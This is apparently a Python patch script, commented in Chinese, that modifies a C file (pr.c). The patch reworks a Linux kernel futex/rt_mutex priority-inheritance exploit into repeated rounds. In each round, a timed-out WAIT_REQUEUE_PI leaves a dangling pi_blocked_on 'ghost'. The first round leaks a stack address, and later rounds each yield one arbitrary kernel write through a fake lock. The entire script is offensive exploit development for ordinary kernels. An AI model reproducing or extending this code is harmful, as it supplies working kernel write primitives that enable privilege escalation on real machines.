# -*- coding: utf-8 -*-
"""pr.c: 把 hammer 改成"回合制"—— 每回合重造一颗幽灵(一幽灵 = 一笔有效写)。

依据(全部真机坐实, 见 analysis/GHOST-MULTI-WRITE-20260927.md):
  * rt_mutex_adjust_pi 走完一次链走就把 task->pi_blocked_on 清空 ⇒ 幽灵是一次性的;
  * 同一线程同一条 futex 路径 ⇒ 幽灵节点地址 S 每次都在同一个地方(实测栈顶-0x428);
  * 静态假 lock(uts 零洞)一个 boot 只能脏一次 ⇒ 泄漏槽只有 ~2 个, 但**带内假 lock
    (S+0x60)每回合都被我们自己的重铺清零** ⇒ 回合之间互不污染。
⇒ 所以: 回合 0 = 泄漏(静态 lock, 拿到 S) ; 回合 1..N = 带内 lock 的一笔有效写。
旗标协议: main --ready--> W --armed--> main(punch) --fired--> W ; main --round_end--> W 再造幽灵。
"""
import io

p = 'pr.c'
s = io.open(p, encoding='utf-8').read()

# ---------- 1) 旗标 ----------
old = 'static volatile int h_armed, h_fired, h_stop, h_ready;'
assert old in s
s = s.replace(old, old + '\nstatic volatile int h_round_end;   /* main: 这回合完了, 去造下一颗幽灵 */')

# ---------- 2) waiter_thread 的回合循环 ----------
old2 = '''  errno = 0;
  abs_after(&ts, 8);                 /* 8s 后超时返回 ⇒ 幽灵留下悬空 pi_blocked_on */
  st_w_sleeping = 1;
  say("[W] 进 WAIT_REQUEUE_PI 前实测 prio=%ld\\n", read_prio(p_tid));
  long r2 = fx(N, FW, 0, &ts, PI, (int)MATCH_ANY);
  fprintf(stderr, "[W] WAIT_REQUEUE_PI ret=%ld errno=%d\\n", r2, errno);
  st_ghost = 1;

  if (HAMMER) {'''
new2 = '''  int round = 0;
 restart:
  errno = 0;
  abs_after(&ts, round ? 3 : 8);     /* 超时返回 ⇒ 留下悬空 pi_blocked_on = 幽灵 */
  st_w_sleeping = 1;
  if (round == 0) say("[W] 进 WAIT_REQUEUE_PI 前实测 prio=%ld\\n", read_prio(p_tid));
  long r2 = fx(N, FW, 0, &ts, PI, (int)MATCH_ANY);
  if (round == 0) fprintf(stderr, "[W] WAIT_REQUEUE_PI ret=%ld errno=%d\\n", r2, errno);
  __atomic_store_n(&st_ghost, 1, __ATOMIC_RELEASE);

  if (HAMMER) {'''
assert old2 in s
s = s.replace(old2, new2)

# 回合内层: 打完 main 说 round_end 就回到 restart 再造幽灵
old3 = '''      __atomic_store_n(&h_fired, 0, __ATOMIC_RELEASE);
      __atomic_store_n(&h_armed, 0, __ATOMIC_RELEASE);
    }
    st_payload = 1;
    return NULL;
  }'''
new3 = '''      __atomic_store_n(&h_fired, 0, __ATOMIC_RELEASE);
      __atomic_store_n(&h_armed, 0, __ATOMIC_RELEASE);
      if (__atomic_load_n(&h_round_end, __ATOMIC_ACQUIRE)) {
        __atomic_store_n(&h_round_end, 0, __ATOMIC_RELEASE);
        __atomic_store_n(&st_ghost, 0, __ATOMIC_RELEASE);   /* 交回给 main: 还没成幽灵 */
        round++;
        if (round >= MAX_ROUNDS) break;
        goto restart;                                        /* ★ 再造一颗幽灵 */
      }
    }
    st_payload = 1;
    return NULL;
  }'''
assert old3 in s
s = s.replace(old3, new3)

s = s.replace('static int HAMMER = 0;', 'static int HAMMER = 0;\nstatic int MAX_ROUNDS = 8;')
s = s.replace('''    } else if (!strncmp(argv[i], "lk=", 3)) {''',
              '''    } else if (!strncmp(argv[i], "maxr=", 5)) {
      MAX_ROUNDS = (int)strtol(argv[i] + 5, NULL, 0);
    } else if (!strncmp(argv[i], "lk=", 3)) {''')

io.open(p, 'w', encoding='utf-8').write(s)
print('ok-part1')
